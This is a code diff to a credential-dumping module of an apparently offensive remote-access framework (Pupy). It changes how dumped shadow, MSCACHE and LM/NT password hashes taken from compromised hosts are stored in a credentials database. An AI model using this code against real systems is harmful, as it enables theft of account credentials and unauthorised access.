@@ -118,7 +118,7 @@ class CredDump(PupyModule):
 
         db = Credentials()
         db.add([
-            {'hashes':hsh, 'Tool': 'Creddump', 'uid':self.client.short_name()} for hsh in hashes
+            {'Hash':':'.join(hsh.split(':')[1:]), 'Login': hsh.split(':')[0], 'Category': 'Shadow hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
         ])
 
         for hsh in hashes:
@@ -185,7 +185,7 @@ class CredDump(PupyModule):
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
             self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                 d.lower(), dn.lower()))
-            hashes.append({'hashes': "%s:%s:%s:%s" % (u.lower(), h.encode('hex'), d.lower(), dn.lower()), 'Tool': 'Creddump', 'uid':self.client.short_name()})
+            hashes.append({'Login': u.lower(), 'Hash': "%s:%s:%s" % (h.encode('hex'), d.lower(), dn.lower()), 'Category': 'MSCACHE hash', 'CredType': 'hash', 'uid':self.client.short_name()})
 
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
@@ -195,7 +195,7 @@ class CredDump(PupyModule):
             if not lmhash: lmhash = empty_lm
             if not nthash: nthash = empty_nt
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
-            hashes.append({'hashes': "%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')), 'Tool': 'Creddump', 'uid':self.client.short_name()})
+            hashes.append({'Login': get_user_name(user), 'Hash': "%s:%s" % (lmhash.encode('hex'), nthash.encode('hex')), 'Category': 'NTLM hash', 'CredType': 'hash', 'uid':self.client.short_name()})
 
         db.add(hashes)
         self.success("Hashes stored on the database")
